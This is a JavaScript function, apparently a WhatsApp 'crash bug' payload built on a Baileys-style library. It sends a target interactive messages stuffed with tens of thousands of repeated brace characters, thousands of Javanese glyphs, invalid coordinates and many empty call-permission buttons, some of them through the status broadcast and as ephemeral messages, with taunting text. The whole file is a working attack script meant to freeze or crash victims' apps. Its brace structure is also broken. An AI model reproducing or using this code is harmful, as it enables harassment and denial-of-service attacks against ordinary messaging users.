async function VerloadXCallFcV2(target) {
try {
const space = "{".repeat(10000);

const messagePayload = {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "VaxzyNotWhyy👀" },
carouselMessage: {
cards: cardsCrL,
messageVersion: 1
}
}
}
}
};
    
const msg = generateWAMessageFromContent(target, messagePayload, {});

await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
   });
    
const messageXCallV2 = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "you are in idiot💥",
hasMediaAttachment: false,
locationMessage: {
degreesLatitude: 323000,
degreesLongitude: -323000,
name: '}'.repeat(50000),
address: '{'.repeat(50000),
},
},
body: {
text: "you are in idiot💥" + "ꦾ".repeat(9999),
footer: "Verload.js"
},
nativeFlowMessage: {
buttons: [
{ 
name: "single_select", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "mpm", 
buttonParamsJson: "" 
}
]
}
}
}
}
};
await sock.relayMessage(target, messageXCallV2, { participant: { jid: target } });
}

const messageXinvis = {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "i crush on you",
hasMediaAttachment: false,
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "i love you",
address: "ោ៝",
},
},
body: {
text: "do you want to be my girlfriend",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
},
contextInfo: {
participant: target,
mentionedJid: ["0@s.whatsapp.net"],
},
},
},
},
};

await sock.relayMessage(target, messageXinvis, {
    messageId: null,
    participant: { jid: target },
    userJid: target,
   });
} catch (err) {
  console.error("Terdapat Kesalahan Pada Struktur Function", err);
}
}